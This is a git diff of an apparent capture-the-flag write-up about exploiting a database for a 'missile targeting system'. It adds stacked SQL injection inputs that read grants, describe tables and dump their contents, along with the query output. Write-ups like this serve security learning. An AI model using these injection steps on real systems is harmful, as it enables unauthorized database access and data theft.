@@ -34,7 +34,7 @@ USER(): targeter@172.18.0.3 |
 ```
 
 #### Getting the rights on the tables
-```
+```SQL
 ;SHOW GRANTS;
 ```
 ```
@@ -47,7 +47,7 @@ Grants for targeter@%: GRANT SELECT ON `missile_targeting_system`.`pointing_mode
 ```
 
 #### Dumping tables data for juicy information
-```
+```SQL
 ;SELECT * FROM pointing_mode_to_str;
 ```
 ```
@@ -55,7 +55,17 @@ id: 1 | numerical_mode: 0 | str_mode: Earth Point Mode | str_desc: When pointing
 id: 2 | numerical_mode: 1 | str_mode: Sun Point Mode | str_desc: When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates. | 
 ```
 #### Dumping the Java Serialized Data and the automation script
-
+```SQL
+;DESCRIBE satellite_query;
+```
+```
+COLUMN_NAME: jid | COLUMN_TYPE: int(11) | IS_NULLABLE: NO | COLUMN_KEY: PRI | COLUMN_DEFAULT: null | EXTRA: auto_increment | 
+COLUMN_NAME: object | COLUMN_TYPE: blob | IS_NULLABLE: YES | COLUMN_KEY:  | COLUMN_DEFAULT: null | EXTRA:  | 
+COLUMN_NAME: results | COLUMN_TYPE: text | IS_NULLABLE: YES | COLUMN_KEY:  | COLUMN_DEFAULT: null | EXTRA:  | 
+```
+```SQL
+;SELECT * FROM satellite_query;
+```
 ```Java
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
